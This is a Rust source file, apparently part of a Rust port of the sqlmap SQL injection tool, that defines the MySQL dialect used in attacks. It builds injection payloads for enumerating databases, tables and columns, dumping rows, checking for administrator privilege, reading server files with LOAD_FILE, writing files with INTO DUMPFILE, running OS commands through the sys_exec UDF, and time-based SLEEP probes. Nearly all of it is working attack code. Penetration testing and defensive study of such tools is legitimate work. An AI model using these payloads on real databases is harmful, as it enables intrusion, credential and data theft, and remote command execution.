//! MySQL / MariaDB / Percona / TiDB / SingleStore / Aurora MySQL / Drizzle.

use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct MySQLDialect;

impl Dialect for MySQLDialect {
    fn dbms(&self) -> Dbms { Dbms::MySQL }
    fn banner_query(&self) -> &'static str { "VERSION()" }
    fn current_user_query(&self) -> &'static str { "CURRENT_USER()" }
    fn current_db_query(&self) -> &'static str { "DATABASE()" }
    fn hostname_query(&self) -> &'static str { "@@HOSTNAME" }
    fn is_dba_query(&self) -> &'static str { "(SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1) LIMIT 1)='Y'" }
    fn list_dbs(&self) -> &'static str { "SELECT GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA" }
    fn list_tables(&self, db: &str) -> String {
        format!("SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}'")
    }
    fn list_columns(&self, db: &str, table: &str) -> String {
        format!("SELECT GROUP_CONCAT(COLUMN_NAME,0x3a,DATA_TYPE) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'")
    }
    fn count_rows(&self, db: &str, table: &str) -> String {
        format!("SELECT COUNT(*) FROM {db}.{table}")
    }
    fn dump_rows(&self, db: &str, table: &str, cols: &[&str], start: usize, count: usize) -> String {
        let cols = if cols.is_empty() { "*".to_string() } else { cols.join(",") };
        format!("SELECT GROUP_CONCAT({cols} SEPARATOR 0x1f) FROM {db}.{table} LIMIT {start},{count}")
    }
    fn file_read(&self, path: &str) -> String {
        format!("HEX(LOAD_FILE('{path}'))")
    }
    fn file_write(&self, bytes_hex: &str, dest: &str) -> String {
        format!("SELECT 0x{bytes_hex} INTO DUMPFILE '{dest}'")
    }
    fn os_cmd(&self, cmd: &str) -> String {
        // UDF route: requires lib_mysqludf_sys.so already installed; runtime
        // will fall back to file_write of the .so when this is the first
        // invocation. The vector here is the call expression once installed.
        format!("SELECT sys_exec('{}')", cmd.replace('\'', "''"))
    }
    fn substr(&self, expr: &str, pos: usize, len: usize) -> String {
        format!("SUBSTRING(({expr}),{pos},{len})")
    }
    fn ord(&self, ch: &str) -> String {
        format!("ORD({ch})")
    }
    fn concat(&self, parts: &[&str]) -> String {
        format!("CONCAT({})", parts.join(","))
    }
    fn sleep(&self, seconds: u32) -> String {
        format!("SLEEP({seconds})")
    }
    fn password_table(&self) -> &'static str {
        "mysql.user"
    }
    fn comment(&self) -> &'static str { "-- -" }
}
